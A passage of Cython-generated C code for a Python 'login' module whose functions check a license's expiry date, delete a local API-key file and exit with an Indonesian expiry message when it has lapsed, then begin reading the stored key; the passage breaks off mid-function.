static PyMethodDef __pyx_mdef_5login_3datawaktu = {"datawaktu", (PyCFunction)__pyx_pw_5login_3datawaktu, METH_O, 0};
static PyObject *__pyx_pw_5login_3datawaktu(PyObject *__pyx_self, PyObject *__pyx_v_exp) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("datawaktu (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_2datawaktu(__pyx_self, ((PyObject *)__pyx_v_exp));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_2datawaktu(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_exp) {
  PyObject *__pyx_v_day = NULL;
  PyObject *__pyx_v_month = NULL;
  PyObject *__pyx_v_year = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v_b = NULL;
  PyObject *__pyx_v_delta = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *(*__pyx_t_6)(PyObject *);
  Py_ssize_t __pyx_t_7;
  Py_UCS4 __pyx_t_8;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("datawaktu", 0);

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_exp, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_kp_u_) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_u_);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if ((likely(PyTuple_CheckExact(__pyx_t_1))) || (PyList_CheckExact(__pyx_t_1))) {
    PyObject* sequence = __pyx_t_1;
    Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
    if (unlikely(size != 3)) {
      if (size > 3) __Pyx_RaiseTooManyValuesError(3);
      else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
      __PYX_ERR(0, 61, __pyx_L1_error)
    }
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    if (likely(PyTuple_CheckExact(sequence))) {
      __pyx_t_2 = PyTuple_GET_ITEM(sequence, 0); 
      __pyx_t_3 = PyTuple_GET_ITEM(sequence, 1); 
      __pyx_t_4 = PyTuple_GET_ITEM(sequence, 2); 
    } else {
      __pyx_t_2 = PyList_GET_ITEM(sequence, 0); 
      __pyx_t_3 = PyList_GET_ITEM(sequence, 1); 
      __pyx_t_4 = PyList_GET_ITEM(sequence, 2); 
    }
    __Pyx_INCREF(__pyx_t_2);
    __Pyx_INCREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_t_4);
    #else
    __pyx_t_2 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 61, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = PySequence_ITEM(sequence, 2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 61, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    #endif
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  } else {
    Py_ssize_t index = -1;
    __pyx_t_5 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 61, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_6 = Py_TYPE(__pyx_t_5)->tp_iternext;
    index = 0; __pyx_t_2 = __pyx_t_6(__pyx_t_5); if (unlikely(!__pyx_t_2)) goto __pyx_L3_unpacking_failed;
    __Pyx_GOTREF(__pyx_t_2);
    index = 1; __pyx_t_3 = __pyx_t_6(__pyx_t_5); if (unlikely(!__pyx_t_3)) goto __pyx_L3_unpacking_failed;
    __Pyx_GOTREF(__pyx_t_3);
    index = 2; __pyx_t_4 = __pyx_t_6(__pyx_t_5); if (unlikely(!__pyx_t_4)) goto __pyx_L3_unpacking_failed;
    __Pyx_GOTREF(__pyx_t_4);
    if (__Pyx_IternextUnpackEndCheck(__pyx_t_6(__pyx_t_5), 3) < 0) __PYX_ERR(0, 61, __pyx_L1_error)
    __pyx_t_6 = NULL;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L4_unpacking_done;
    __pyx_L3_unpacking_failed:;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_6 = NULL;
    if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
    __PYX_ERR(0, 61, __pyx_L1_error)
    __pyx_L4_unpacking_done:;
  }
  __pyx_v_day = __pyx_t_2;
  __pyx_t_2 = 0;
  __pyx_v_month = __pyx_t_3;
  __pyx_t_3 = 0;
  __pyx_v_year = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_bulan_balik); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyObject_GetItem(__pyx_t_1, __pyx_v_month); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF_SET(__pyx_v_month, __pyx_t_4);
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_strptime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = 0;
  __pyx_t_8 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ha); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_bu); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ta); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_t_5);
  __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_date_format); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  __pyx_t_9 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_9 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_t_5, __pyx_t_1};
    __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 63, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_t_5, __pyx_t_1};
    __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 63, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  } else
  #endif
  {
    __pyx_t_10 = PyTuple_New(2+__pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 63, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    if (__pyx_t_2) {
      __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_2); __pyx_t_2 = NULL;
    }
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_10, 0+__pyx_t_9, __pyx_t_5);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_10, 1+__pyx_t_9, __pyx_t_1);
    __pyx_t_5 = 0;
    __pyx_t_1 = 0;
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 63, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_a = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_datetime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_strptime); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = 0;
  __pyx_t_8 = 127;
  __pyx_t_1 = __Pyx_GetItemInt(__pyx_v_day, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_5);
  __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_month, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_5);
  __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_year, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_t_5);
  __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_3, 3, __pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_date_format); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = NULL;
  __pyx_t_9 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_10);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_10, function);
      __pyx_t_9 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_10)) {
    PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_t_5, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 64, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
    PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_t_5, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 64, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  {
    __pyx_t_2 = PyTuple_New(2+__pyx_t_9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 64, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (__pyx_t_1) {
      __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1); __pyx_t_1 = NULL;
    }
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_2, 0+__pyx_t_9, __pyx_t_5);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 1+__pyx_t_9, __pyx_t_3);
    __pyx_t_5 = 0;
    __pyx_t_3 = 0;
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_2, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 64, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __pyx_v_b = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __pyx_t_4 = PyNumber_Subtract(__pyx_v_b, __pyx_v_a); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_v_delta = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_delta, __pyx_n_s_days); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_10 = PyObject_RichCompare(__pyx_t_4, __pyx_int_0, Py_LT); __Pyx_XGOTREF(__pyx_t_10); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_10); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  if (__pyx_t_11) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 67, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_remove); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 67, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_kp_u_data_apikey_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_u_data_apikey_txt);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 67, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_prints); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 68, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Panel); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 68, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_5, __pyx_kp_u_bold_red_Maaf_lisensi_anda_tida) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_u_bold_red_Maaf_lisensi_anda_tida);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 68, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_10 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 68, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    
    __pyx_t_10 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 69, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    
    goto __pyx_L5;
  }

  
   {
  }
  __pyx_L5:;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("login.datawaktu", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_day);
  __Pyx_XDECREF(__pyx_v_month);
  __Pyx_XDECREF(__pyx_v_year);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v_b);
  __Pyx_XDECREF(__pyx_v_delta);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_5ceklisen(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); 
static PyMethodDef __pyx_mdef_5login_5ceklisen = {"ceklisen", (PyCFunction)__pyx_pw_5login_5ceklisen, METH_NOARGS, 0};
static PyObject *__pyx_pw_5login_5ceklisen(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("ceklisen (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_4ceklisen(__pyx_self);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_4ceklisen(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_apikey = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_nama = NULL;
  PyObject *__pyx_v_email = NULL;
  PyObject *__pyx_v_status = NULL;
  PyObject *__pyx_v_bergabung = NULL;
  PyObject *__pyx_v_kadaluwarsa = NULL;
  PyObject *__pyx_v_sisahari = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  Py_UCS4 __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("ceklisen", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
     {

      
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 76, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 76, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
